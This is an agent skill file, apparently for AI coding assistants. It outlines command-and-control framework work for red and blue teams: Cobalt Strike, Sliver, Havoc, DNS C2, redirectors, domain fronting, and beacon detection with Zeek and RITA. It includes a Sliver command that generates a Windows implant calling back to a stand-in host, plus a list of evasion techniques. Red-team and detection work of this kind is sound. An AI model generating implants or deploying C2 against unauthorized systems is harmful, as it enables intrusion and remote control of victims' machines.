<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: c2-frameworks
description: >-
  Command and control framework operations covering Cobalt Strike deployment, Sliver C2
  configuration, Havoc framework setup, DNS C2 channels, custom C2 protocol development,
  beaconing pattern detection, C2 traffic analysis, redirector implementation,
  infrastructure hunting, Mythic C2 configuration, domain fronting, and C2 evasion
  techniques. Enables red team infrastructure operations and blue team detection with
  Cobalt Strike, Sliver, Havoc, Mythic, and network analysis tooling.
domain: cybersecurity
subdomain: c2-frameworks
tags:
  - c2-frameworks
  - cobalt-strike
  - sliver
  - havoc
  - dns-c2
  - custom-c2
  - beaconing
  - traffic-analysis
  - redirectors
  - infrastructure-hunting
  - mythic
  - domain-fronting
  - c2-evasion
  - malleable-c2
  - implants
  - team-server
version: "1.0"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1071", "T1573", "T1090", "T1572", "T1001"]
  cwe: ["CWE-300", "CWE-319", "CWE-693", "CWE-778", "CWE-941"]
  frameworks: ["MITRE ATT&CK", "CWE", "OWASP", "PTES"]
---

# C2 Frameworks

## When to Use

Activate when the operator asks about C2 framework deployment, implant generation,
C2 traffic detection, infrastructure setup, redirector configuration, beaconing
analysis, or adversary infrastructure hunting.

Mode: `[MODE: RED]` for C2 deployment and operations; `[MODE: BLUE]` for C2 detection and hunting; `[MODE: PURPLE]` for detection engineering.

## Prerequisites

- Tools: `cobalt-strike`, `sliver`, `havoc`, `mythic`, `wireshark`, `zeek`
- Dedicated infrastructure for C2 operations
- Authorization and signed Rules of Engagement (RoE)
- Operator certificates and authentication configured

## Quick Reference

| Technique | Primary Tools | CWE |
|-----------|--------------|-----|
| Cobalt Strike | Cobalt Strike, cs2modrewrite, Apache | CWE-300 |
| Sliver C2 | Sliver, sliver-client, cfssl | CWE-300 |
| Havoc framework | Havoc, havoc-client, golang | CWE-300 |
| DNS C2 | iodine, dnscat2, DNSStager | CWE-300 |
| Custom C2 | Python, Go, libsodium, protobuf | CWE-300 |
| Beaconing detection | RITA, Zeek, JA3, NetworkMiner | CWE-300 |
| Traffic analysis | Zeek, Wireshark, tshark, Arkime | CWE-300 |
| Redirectors | Apache, Nginx, socat, CloudFront | CWE-300 |
| Infrastructure hunting | JARM, Shodan, Censys, pDNS | CWE-300 |
| Mythic C2 | Mythic, Docker, mythic-cli | CWE-300 |
| Domain fronting | CloudFront, Azure CDN, Fastly | CWE-300 |
| C2 evasion | Malleable C2, JA3, traffic-shaper | CWE-300 |

## Workflow

### Step 1: Plan Infrastructure

```bash
# Generate Malleable C2 profile
# Configure redirectors and team server
# Set up DNS records and certificates
```

### Step 2: Deploy C2 Server

```bash
# Sliver example
sliver-server

# Generate implant
sliver > generate --mtls myc2.example.com --os windows --arch amd64 --save /tmp/implant.exe
```

### Step 3: Monitor and Detect

```bash
# Zeek connection logging
zeek -r capture.pcap
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p

# RITA beaconing analysis
rita import capture.pcap -d engagement
rita show-beacons engagement
```



## Verification

- [ ] All tools installed and operational
- [ ] Target acquired through authorized channels
- [ ] Analysis completed with findings documented
- [ ] Detection opportunities identified for blue team
- [ ] Artifacts preserved and report generated

## References

- [MITRE ATT&CK](https://attack.mitre.org/) — Adversary tactics and techniques
- [CWE](https://cwe.mitre.org/) — Common Weakness Enumeration
- [OWASP](https://owasp.org/) — Open Web Application Security Project
